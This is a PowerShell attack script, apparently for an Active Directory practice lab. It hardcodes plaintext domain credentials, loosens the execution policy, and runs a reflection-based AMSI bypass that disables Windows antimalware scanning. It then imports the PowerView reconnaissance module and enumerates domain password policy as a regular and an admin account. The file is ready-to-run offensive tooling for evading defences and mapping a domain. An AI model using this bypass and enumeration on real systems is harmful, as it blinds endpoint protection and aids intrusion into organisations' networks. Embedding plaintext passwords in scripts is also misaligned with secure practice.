# Rename the PowerShell window to "PowerView"
$Host.UI.RawUI.WindowTitle = "PowerView"

# Define credentials
$securePassword_regular = ConvertTo-SecureString "sexywolfy" -AsPlainText -Force
$credential_regular = New-Object System.Management.Automation.PSCredential("NORTH\robb.stark", $securePassword_regular)

$securePassword_admin = ConvertTo-SecureString "iamthekingoftheworld" -AsPlainText -Force
$credential_admin = New-Object System.Management.Automation.PSCredential("sevenkingdoms\robert.baratheon", $securePassword_admin)

# Set Execution Policy to Full Language Mode
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -ErrorAction Stop
$ExecutionContext.SessionState.LanguageMode = "FullLanguage"

# AMSI Bypass
Write-Output "Attempting AMSI bypass..."
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)

$output = try {
    amsiInitFailed
} catch {
    $_.Exception.Message
}

# Check the output for specific error messages
if ($output -match "is not recognized as the name of a cmdlet") {
    Write-Output "AMSI bypass successful: 'amsiInitFailed' is not recognized."
} elseif ($output -match "has been blocked by your antivirus software") {
    Write-Output "AMSI bypass failed: 'amsiInitFailed' command got blocked by antivirus."
    exit 1  # Exit with an error code to signal failure
} else {
    Write-Output "Unexpected output: $output"
    exit 1  # Exit with an error code for unexpected result
}

# Unblock and import PowerView module
Unblock-File ./PowerView/PowerView.ps1 -ErrorAction Stop
Import-Module ./PowerView/PowerView.ps1 -Verbose -ErrorAction Stop

# Verify PowerView installation with Get-NetDomain
try {
    Write-Output "Verifying PowerView installation with Get-NetDomain..."
    Get-NetDomain -ErrorAction Stop
} catch {
    Write-Output "PowerView verification failed. Get-NetDomain could not be run: $_"
}

# Run (Get-DomainPolicy).SystemAccess as `robb.stark`
Read-Host "Press Enter to run (Get-DomainPolicy).SystemAccess for PowerView as robb.stark"
try {
    (Get-DomainPolicy -Credential $credential_regular).SystemAccess
} catch {
    $_  # Output the error message directly
}

# Run (Get-DomainPolicy).SystemAccess as `robert.baratheon`
Read-Host "Press Enter to run (Get-DomainPolicy).SystemAccess for PowerView as robert.baratheon"
try {
    (Get-DomainPolicy -Credential $credential_admin).SystemAccess
} catch {
    $_  # Output the error message directly
}
